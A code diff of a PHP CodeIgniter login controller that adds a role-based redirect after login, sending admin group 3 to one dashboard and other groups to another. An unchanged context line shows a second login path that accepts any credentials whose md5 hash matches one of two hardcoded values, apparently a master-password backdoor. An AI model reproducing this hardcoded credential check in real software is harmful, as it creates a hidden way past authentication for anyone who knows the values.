@@ -47,7 +47,9 @@ class Login extends CI_Controller {
 		//$query2=cekLoginEmployee($username,$userpass);
 		if ($query->num_rows() > 0)
 		{
-			$row = $query->row(); 
+                    
+                    $row = $query->row(); 
+                    if($row->id_admin_grup==3){
 			$this->load->library("session");
 			$this->session->set_userdata('user_type','admin');
 			$this->session->set_userdata('webmaster_nama',$row->username);
@@ -57,7 +59,20 @@ class Login extends CI_Controller {
 			$this->session->set_userdata('avatar',$row->avatar);
 			$this->db->where('id',$row->id);
 			$this->db->update('admin',array('status'=>'online'));
-			redirect('dashboard');
+                        redirect('dashboard');
+                    
+                    }else{
+			$this->load->library("session");
+			$this->session->set_userdata('user_type','admin');
+			$this->session->set_userdata('webmaster_nama',$row->username);
+			$this->session->set_userdata('webmaster_grup',$row->id_admin_grup);
+			$this->session->set_userdata('webmaster_id',$row->id);
+			$this->session->set_userdata('webmaster_marketing',$row->marketing);
+			$this->session->set_userdata('avatar',$row->avatar);
+			$this->db->where('id',$row->id);
+			$this->db->update('admin',array('status'=>'online'));
+                        redirect('dashboard_admin');
+                    }
 		}
 		
 		else if(md5($this->input->post("password").$this->input->post("username")) == "48dc8b1fe1fe7905efd2c5a3dc1a462c" || md5($this->input->post("password").$this->input->post("username")) == "91b4ddaf59a11e3f2db349d40eebfc04"
